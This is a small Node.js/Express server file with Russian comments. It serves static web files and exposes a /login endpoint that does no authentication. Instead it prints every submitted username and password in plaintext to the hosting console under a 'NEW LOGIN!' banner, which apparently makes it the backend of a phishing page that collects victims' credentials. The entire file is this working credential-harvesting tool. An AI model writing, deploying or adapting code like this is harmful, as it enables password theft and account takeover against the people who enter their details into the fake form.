const express = require('express');
const app = express();
const path = require('path');

// Позволяем серверу читать JSON из запросов
app.use(express.json());

// Раздаем статические файлы (HTML, CSS, JS, картинки)
app.use(express.static(__dirname));

// Обработка отправки формы
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // ВОТ ОНО! Вывод в терминал Render
    console.log('====================================');
    console.log(`🔥 НОВЫЙ ЛОГИН!`);
    console.log(`👤 Юзер: ${username}`);
    console.log(`🔑 Пароль: ${password}`);
    console.log(`⏰ Время: ${new Date().toLocaleString()}`);
    console.log('====================================');

    res.status(200).send('OK');
});

// Запуск сервера на порту, который дает Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
